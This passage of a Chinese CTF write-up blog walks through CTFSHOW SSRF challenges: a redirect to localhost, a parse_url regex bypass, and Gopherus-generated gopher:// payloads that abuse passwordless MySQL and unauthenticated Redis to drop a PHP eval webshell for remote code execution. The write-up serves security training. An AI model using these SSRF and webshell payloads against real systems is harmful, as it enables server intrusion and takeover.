+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>http://43.140.251.169/ssrf.php</code></p>
+<ul>
+<li>dns重绑定</li>
+</ul>
+<p>就和上题一样的payload</p>
+<h2 id="Web358（正则匹配）"><a href="#Web358（正则匹配）" class="headerlink" title="Web358（正则匹配）"></a>Web358（正则匹配）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这道题的意思就是正则匹配</p>
+<p>需要<code>http://ctf.</code>开头，<code>show</code>结束</p>
+<p>直接payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure>
+
+<p>URL解析是这样的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">完整url:</span><br><span class="line">scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</span><br></pre></td></tr></table></figure>
+
+<p>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://u:p@a.com:80@b.com/</span><br><span class="line">解析结果：</span><br><span class="line">    schema: http </span><br><span class="line">    host: b.com</span><br><span class="line">    user: u</span><br><span class="line">    pass: p@a.com:80</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Web359-打无密码mysql"><a href="#Web359-打无密码mysql" class="headerlink" title="Web359(打无密码mysql)"></a>Web359(打无密码mysql)</h2><p>提示我们是无密码的mysql</p>
+<p>然后题目就是一个登入界面：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006173554328.png" alt="image-20221006173554328"></p>
+<p>抓包分析后发现有post请求：<br><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006173611587.png" alt="image-20221006173611587"></p>
+<p>这个returl很可疑，可能存在ssrf漏洞</p>
+<p>用gopherus工具去打这一题，很像个脚本小子尼玛的</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006180109536.png" alt="image-20221006180109536"></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006173715730.png" alt="image-20221006173715730"></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006173837304.png" alt="image-20221006173837304"></p>
+<p>把工具给我们生成的payload注入即可：</p>
+<p>这边要注意把_后面的数字再url编码一次，防止出现特殊字符，后端 curl 接收到参数后会默认解码一次，浏览器也会解码一次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2547%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2522%253b%2501%2500%2500%2500%2501</span><br></pre></td></tr></table></figure>
+
+<p>之后访问1.php直接RCE就可以了</p>
+<h2 id="Web360（打redis）"><a href="#Web360（打redis）" class="headerlink" title="Web360（打redis）"></a>Web360（打redis）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>什么是Redis未授权访问？</p>
+<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器</p>
+<p>简单说，漏洞的产生条件有以下两点：</p>
+<p>redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网<br>没有设置密码认证（一般为空），可以免密码远程登录redis服务</p>
+</blockquote>
+<p>这边就直接开始当脚本小子了呜呜呜，等我有能力一定回头来分析</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006175004839.png" alt="image-20221006175004839"></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006175009287.png"></p>
+<p>这边首先可以用dict协议探测一下端口是否开放：<br><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006175405141.png" alt="image-20221006175405141"></p>
+<p>出现这个报错就说明是开放了6379端口，也就是存在redis</p>
+<p>之后就用生成的payload注入了，和上次一样_后面的内容要编码，假如我们生成payload时候按照默认的来，那就是在shell.php，访问shell的php漫游</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006180647963.png" alt="image-20221006180647963"></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221006181005598.png" alt="image-20221006181005598"></p>
+<h2 id="不错的文章收集"><a href="#不错的文章收集" class="headerlink" title="不错的文章收集"></a>不错的文章收集</h2><p>parse_url小结:</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11137159.html">https://www.cnblogs.com/tr1ple/p/11137159.html</a></p>
+<p>SSRF入门详解</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51353029/article/details/113574201">https://blog.csdn.net/weixin_51353029/article/details/113574201</a></p>
+<p>SSRF利用 Gopher 协议拓展攻击面</p>
+<p><a target="_blank" rel="noopener" href="https://berl1n.blog.csdn.net/article/details/103026470">https://berl1n.blog.csdn.net/article/details/103026470</a></p>
+<p>SSRF中利用到的协议（DICT）</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shayebudon/article/details/123805301?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166504955016782388036335%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166504955016782388036335&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~baidu_landing_v2~default-2-123805301-null-null.article_score_rank_blog&amp;utm_term=dict%E5%8D%8F%E8%AE%AE&amp;spm=1018.2226.3001.4450">https://blog.csdn.net/shayebudon/article/details/123805301?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166504955016782388036335%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166504955016782388036335&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~baidu_landing_v2~default-2-123805301-null-null.article_score_rank_blog&amp;utm_term=dict%E5%8D%8F%E8%AE%AE&amp;spm=1018.2226.3001.4450</a></p>
+<p>CTFSHOW-SSRF</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120536552?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166504161616782412591597%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166504161616782412591597&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-120536552-null-null.142%5Ev51%5E">https://blog.csdn.net/q20010619/article/details/120536552?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166504161616782412591597%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166504161616782412591597&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-120536552-null-null.142^v51^</a></p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/CTFSHOW/" class="tag">#CTFSHOW</a><a href="/tags/SSRF/" class="tag">#SSRF</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/02/CTFSHOW-SSTI/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">CTFSHOW-SSTI</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/02/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019%5DEasySQL/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">[极客大挑战 2019]EasySQL</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
